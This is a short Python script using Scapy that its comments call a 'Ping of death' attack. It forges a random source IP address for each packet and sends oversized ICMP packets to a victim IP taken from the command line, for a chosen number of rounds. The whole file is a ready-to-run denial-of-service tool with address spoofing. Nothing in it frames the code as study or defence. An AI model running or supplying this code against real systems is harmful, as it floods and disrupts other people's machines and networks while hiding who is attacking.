#Extra packages needed for this to run: Scapy.py
from scapy.all import *
from datetime import datetime
import random



def random_address_generator():
    """ Generate a random spoofed src ip address"""
    addr = [1,1,1,1]
    d = "."
    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))
    return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3])


def ping(targetedIp, targetedPort, duration):
    spoofed_ip = random_address_generator()
    for _ in range(duration):
        spoofed_ip = random_address_generator()
        ip_header = IP(src=spoofed_ip, dst=targetedIp)
        packet = ip_header/ICMP()/("d"*60000)
        send(packet, verbose=0)
        
if __name__ == "__main__":

    # The Ping of death algorithm works
    # by generating a random spoofed ip address
    # and then sending a big IPV4 packet to the targeted ip 
    """Cmd args: targetIp, TargetedPort, duration"""
    print("Preparing to ping victim PC")
    ping(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


